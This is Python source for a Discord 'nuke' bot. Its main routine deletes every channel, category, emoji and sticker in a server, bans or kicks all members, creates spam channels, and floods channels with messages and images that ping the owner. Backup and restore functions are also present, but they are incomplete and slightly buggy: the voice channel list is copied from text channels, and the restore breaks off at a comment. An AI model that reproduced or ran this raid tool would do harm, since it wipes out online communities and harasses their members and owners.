import discord
import shelve
from config import *


async def backup(guild):
    categories = [category.name for category in guild.categories]
    text_channels = [channel.name for channel in guild.text_channels]
    voice_channels = [channel.name for channel in guild.text_channels]
    members = [(member.name, member.id) for member in guild.members]
    icon = await guild.icon.read()
    if guild.banner:
        banner = await guild.banner.read()
    else:
        banner = None
    d = shelve.open(str(guild.id))
    d['name'], d['owner'], d['emojis'], d['stickers'], d['categories'], d['text_channels'], d['voice_channels'], d[
        'members'], d['member_count'], d['icon'], d[
        'banner'] = guild.name, guild.owner.name, guild.emojis, guild.stickers, categories, text_channels, voice_channels, members, guild.member_count, icon, banner
    d.close()


async def delete_channels(guild):
    if b_delete_text_channels:
        for channel in guild.text_channels:
            await channel.delete()
    if b_delete_voice_channels:
        for channel in guild.voice_channels:
            await channel.delete()
    if b_delete_categories:
        for category in guild.categories:
            await category.delete()


async def ban_or_kick(guild):
    for member in guild.members:
        if b_ban_users:
            await member.ban()
        elif b_kick_users:
            await member.kick()


async def delete_emojis(guild):
    for emoji in guild.emojis:
        await emoji.delete()


async def delete_stickers(guild):
    for sticker in guild.stickers:
        await sticker.delete()


async def create_channels(guild):
    for i in range(1, num_spam_channels + 1):
        cat = None
        if b_create_categories:
            cat = await guild.create_category(f"{category_name} {i}")
        if b_create_text_channels:
            await guild.create_text_channel(name=text_channel_name, category=cat)
        if b_create_voice_channels:
            await guild.create_voice_channel(name=voice_channel_name, category=cat)


async def spam(guild):
    for channel in guild.text_channels:
        if b_spam_text_channels:
            await channel.send(f"{spam_message}\n{guild.owner.mention}")
        if b_spam_images:
            await channel.send(file=discord.File(fp=spam_img))


async def nuke(guild):
    owner = guild.owner
    print(f'Nuking: {guild.name}\nOwned by: {owner.name}\nMembers: {len(guild.members)}')
    print(
        f'Nuke settings:\nDelete\nStickers: {b_delete_stickers}\nEmojis: {b_delete_emojis}\nText Channels: '
        f'{b_delete_text_channels}\nVoice Channels: {b_delete_voice_channels}\nCategories: {b_delete_categories}'
        f'\nKick Members: {b_kick_users}\nBan Members: {b_ban_users}\nCreate\nCategories: {b_create_categories}\n'
        f'Text channels: {b_create_text_channels}\nVoice channels:{b_create_voice_channels}\nSpam\nText: '
        f'{b_spam_text_channels}\nReactions: {b_spam_reacts}\nImage: {b_spam_images}')
    if b_delete_text_channels or b_delete_voice_channels or b_delete_categories:
        await delete_channels(guild)
    if b_ban_users or b_kick_users:
        await ban_or_kick(guild)
    if b_delete_emojis:
        await delete_emojis(guild)
    if b_delete_stickers:
        await delete_stickers(guild)
    if b_create_text_channels or b_create_voice_channels or b_create_categories:
        await create_channels(guild)
    if b_spam_text_channels or b_spam_images:
        await spam(guild)


async def restore(guild):
    d = shelve.open(str(guild.id))
    # Set name back if changed
    if guild.name != d['name']:
        guild.edit(name=d['name'])
    # Replace missing emojis/stickers
    # Create missing categories - Check if list of category names match, if not wipe and replace
    categories = [cat.name for cat in guild.categories]
    if categories != d['categories']:
        for category in guild.categories:
            await category.delete()
        for category in d['categories']:
            await guild.create_category(category)
    # Create missing text channels ^^
    text_channels = [channel.name for channel in guild.text_channels]
    if text_channels != d['text_channels']:
        for channel in guild.text_channels:
            await channel.delete()
        for channel in d['text_channels']:
            await guild.create_text_channel(channel)
    # Create missing voice channels ^^
    voice_channels = [channel.name for channel in guild.voice_channels]
    if voice_channels != d['voice_channels']:
        for channel in guild.voice_channels:
            await channel.delete()
        for channel in d['voice_channels']:
            await guild.create_voice_channel(channel)
    # Invite missing members - Compare member lists > Send message to anyone who isnt in the server with invite
    members = [(member.name, member.id) for member in guild.members]
    if members != d['members']:
        set1 = set(members)
        set2 = set(d['members'])
        missing = set2-set1
        for x in missing:
            print(x)
    # Set icon and banner back if changed > Compare bytes, set back if changed
